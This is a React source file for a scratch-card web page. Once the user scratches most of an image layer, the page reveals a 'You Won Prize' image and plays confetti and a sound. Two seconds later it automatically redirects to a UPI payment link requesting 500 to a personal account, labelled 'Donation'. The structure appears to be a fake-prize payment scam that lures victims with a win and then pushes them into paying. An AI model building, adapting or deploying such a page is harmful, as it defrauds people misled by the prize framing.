import { useEffect, useRef, useState } from 'react';
import IMG1 from './IMAGES/IMG1.jpg';
import IMG2 from './IMAGES/IMG2.png';
import IMG3 from './IMAGES/IMG3.jpg';
import IMG4 from './IMAGES/IMG4.jpg';

// Confetti Component
const Confetti = () => {
  const confettiPieces = Array.from({ length: 400 }, (_, i) => {
    const isRound = Math.random() > 0.5;
    return {
      id: i,
      left: Math.random() * 100,
      delay: Math.random() * 0.3,
      duration: 1.5 + Math.random() * 1.5,
      color: ['#FFD700', '#FF6B6B', '#4ECDC4', '#45B7D1', '#FFA07A', '#FF1493', '#00FF00', '#FF4500'][Math.floor(Math.random() * 8)],
      isRound,
      size: isRound ? (3 + Math.random() * 4) : (4 + Math.random() * 6),
    };
  });

  return (
    <div className="fixed inset-0 pointer-events-none overflow-hidden">
      {confettiPieces.map((piece) => (
        <div
          key={piece.id}
          style={{
            position: 'fixed',
            left: `${piece.left}%`,
            top: '-20px',
            backgroundColor: piece.color,
            animation: `fall ${piece.duration}s linear ${piece.delay}s forwards`,
            boxShadow: `0 0 10px ${piece.color}`,
            borderRadius: piece.isRound ? '50%' : '2px',
            width: `${piece.size}px`,
            height: `${piece.size}px`,
          }}
        />
      ))}
      <style>{`
        @keyframes fall {
          to {
            transform: translateY(110vh) rotate(720deg);
            opacity: 0;
          }
        }
      `}</style>
    </div>
  );
};

export default function ScratchCardPage() {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const isDrawing = useRef(false);
  const [showCelebration, setShowCelebration] = useState(false);
  const audioContextRef = useRef<AudioContext | null>(null);

  // Play celebration sound
  const playCelebrationSound = () => {
    try {
      const audioContext = audioContextRef.current || new (window.AudioContext || (window as any).webkitAudioContext)();
      audioContextRef.current = audioContext;

      // Create multiple notes for a celebratory sound
      const notes = [523.25, 659.25, 783.99, 1046.5]; // C, E, G, C (higher octave)
      let time = audioContext.currentTime;

      notes.forEach((frequency) => {
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();

        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);

        oscillator.frequency.value = frequency;
        oscillator.type = 'sine';

        gainNode.gain.setValueAtTime(0.3, time);
        gainNode.gain.exponentialRampToValueAtTime(0.01, time + 0.3);

        oscillator.start(time);
        oscillator.stop(time + 0.3);

        time += 0.1;
      });
    } catch (error) {
      console.log('Audio context error:', error);
    }
  };

  // Open PhonePe/UPI with direct payment link
  const redirectToPhonePe = () => {
    try {
      const amount = '500';
      const upiString = `upi://pay?pa=gazit6557@okaxis&pn=Support%20Brief&am=${amount}&tn=Donation`;
      
      // Open UPI payment link - this will redirect to PhonePe, Google Pay, or any UPI app
      window.location.href = upiString;
    } catch (error) {
      console.log('Payment redirect error:', error);
    }
  };

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;

    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    // Load IMG1 first to get dimensions
    const img = new Image();
    img.src = IMG1;
    img.onload = () => {
      // Set canvas size to match the image
      canvas.width = img.width;
      canvas.height = img.height;
      ctx.drawImage(img, 0, 0);
    };

    const scratch = (e: MouseEvent | TouchEvent) => {
      const rect = canvas.getBoundingClientRect();
      let x, y;

      if (e instanceof MouseEvent) {
        x = (e.clientX - rect.left) * (canvas.width / rect.width);
        y = (e.clientY - rect.top) * (canvas.height / rect.height);
      } else {
        x = (e.touches[0].clientX - rect.left) * (canvas.width / rect.width);
        y = (e.touches[0].clientY - rect.top) * (canvas.height / rect.height);
      }

      // Create circular eraser
      const radius = 40;
      ctx.beginPath();
      ctx.arc(x, y, radius, 0, Math.PI * 2);
      ctx.clearRect(x - radius, y - radius, radius * 2, radius * 2);
      checkScratchPercentage();
    };

    const checkScratchPercentage = () => {
      if (!canvas || !ctx) return;

      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      const data = imageData.data;
      let transparentPixels = 0;

      for (let i = 3; i < data.length; i += 4) {
        if (data[i] < 128) {
          transparentPixels++;
        }
      }

      const scratchPercentage = (transparentPixels / (data.length / 4)) * 100;

      // Auto-clear everything when 40% is scratched
      if (scratchPercentage > 40 && !showCelebration) {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        
        // Trigger celebration AFTER auto-clear
        setTimeout(() => {
          setShowCelebration(true);
          playCelebrationSound();
          
          // Redirect to PhonePe after 2 seconds
          setTimeout(() => {
            redirectToPhonePe();
          }, 2000);
        }, 100);
      }
    };

    // Handle scratching
    const handleMouseDown = (e: MouseEvent) => {
      isDrawing.current = true;
      scratch(e);
    };

    const handleMouseMove = (e: MouseEvent) => {
      if (isDrawing.current) {
        scratch(e);
      }
    };

    const handleMouseUp = () => {
      isDrawing.current = false;
    };

    const handleTouchStart = (e: TouchEvent) => {
      isDrawing.current = true;
      scratch(e as any);
    };

    const handleTouchMove = (e: TouchEvent) => {
      if (isDrawing.current) {
        scratch(e as any);
      }
    };

    const handleTouchEnd = () => {
      isDrawing.current = false;
    };

    canvas.addEventListener('mousedown', handleMouseDown);
    canvas.addEventListener('mousemove', handleMouseMove);
    canvas.addEventListener('mouseup', handleMouseUp);
    canvas.addEventListener('touchstart', handleTouchStart);
    canvas.addEventListener('touchmove', handleTouchMove);
    canvas.addEventListener('touchend', handleTouchEnd);

    return () => {
      canvas.removeEventListener('mousedown', handleMouseDown);
      canvas.removeEventListener('mousemove', handleMouseMove);
      canvas.removeEventListener('mouseup', handleMouseUp);
      canvas.removeEventListener('touchstart', handleTouchStart);
      canvas.removeEventListener('touchmove', handleTouchMove);
      canvas.removeEventListener('touchend', handleTouchEnd);
    };
  }, []);

  return (
    <div className="flex flex-col items-center justify-start w-screen min-h-screen bg-gray-100 p-0 m-0">
      {showCelebration && <Confetti />}

      {/* TOP - IMG4 */}
      <div className="w-full" style={{ flex: '0 0 25%', minHeight: '0' }}>
        <img src={IMG4} alt="Top Banner" className="w-full h-full object-cover" />
      </div>

      {/* MIDDLE - Scratch Card (IMG1 with IMG2 Prize underneath) */}
      <div className="relative w-full" style={{ flex: '0 0 50%', minHeight: '0' }}>
        {/* IMG2 - Prize image (revealed when scratched) */}
        <img src={IMG2} alt="You Won Prize" className="w-full h-full object-cover" />

        {/* IMG1 - Scratch layer on top */}
        <canvas
          ref={canvasRef}
          className="absolute inset-0 cursor-pointer"
          style={{ width: '100%', height: '100%', display: 'block', top: 0, left: 0 }}
        />
      </div>

      {/* BOTTOM - IMG3 */}
      <div className="w-full" style={{ flex: '0 0 25%', minHeight: '0' }}>
        <img src={IMG3} alt="Bottom Section" className="w-full h-full object-cover" />
      </div>
    </div>
  );
}
